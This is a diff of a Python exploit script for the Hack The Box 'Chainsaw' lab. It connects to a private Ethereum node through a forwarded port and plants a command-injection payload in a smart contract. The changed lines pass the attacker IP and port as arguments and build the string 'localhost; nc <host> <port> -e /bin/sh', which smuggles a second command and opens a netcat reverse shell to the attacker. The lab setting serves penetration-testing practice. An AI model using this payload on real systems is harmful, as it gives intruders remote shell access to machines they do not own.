@@ -9,6 +9,7 @@ from web3 import Web3
 import logging
 import json
 import sys
+import requests
 
 logger = logging.getLogger('default_log')
 handler = logging.StreamHandler()
@@ -17,19 +18,49 @@ handler.setFormatter(formatter)
 logger.addHandler(handler)
 logger.setLevel(logging.INFO)
 
+
+# Print help
+def printusage():
+    print("Can only be used in Chainsaw - HTB, as a helper function of getting user.")
+    print("Usage: " + sys.argv[0] + " <CONTRACT ADDRESS> <ATTCKER IP> <ATTACKER NC PORT>")
+
+
+# Get predefined address
+try:
+    ftp_contraddr = sys.argv[1]
+    logger.info("Predefined Contract Address: " + ftp_contraddr)
+except IndexError:
+    logger.error("Predefined Contract Address not found")
+    printusage()
+    sys.exit(1)
+
+# Attacker info
+try:
+    AttackHost = sys.argv[2]
+    AttackPort = sys.argv[3]
+    AttackPayload = "localhost; nc " + AttackHost + " " + AttackPort + " -e /bin/sh"
+except IndexError:
+    logger.error("Attack information not found.")
+    printusage()
+    sys.exit(1)
+
 # SSH Port Forward: localhost:8545:10.10.10.142:9810
 ethneturl = "http://localhost:8545"
 logger.info("The 10.10.10.142:9810 should be forwarded to {localip}".format(localip=ethneturl))
 
 # predenfined contract address read from the file
-predefined_cont_addr = Web3.toChecksumAddress("0x3C0451Ecf8fC0DF1170F2F14522c107cB02BF54B")
+predefined_cont_addr = Web3.toChecksumAddress(ftp_contraddr)
 logger.info("YOU SHOULD MODIFY THE ADDRESS AND PAYLOAD BEFORE RUN THIS SCRIPT!")
 input("Please confirm the above notification, then press enter to continue")
 
-# Attacker info
-AttackHost = "10.10.16.80"
-AttackPort = "14499"
-AttackPayload = "localhost; nc " + AttackHost + " " + AttackPort + " -e /bin/sh"
+# Detect if port-forward working
+r = requests.get(ethneturl, timeout=5)
+if r.status_code == 400:
+    logger.info("Port Forward seems working, go to next step...")
+else:
+    logger.error("Private ETH Network forward to {localip} is not successful.".format(localip=ethneturl))
+    sys.exit(1)
+
 
 # Web3Py related code
 w3eng = Web3(Web3.HTTPProvider(ethneturl))
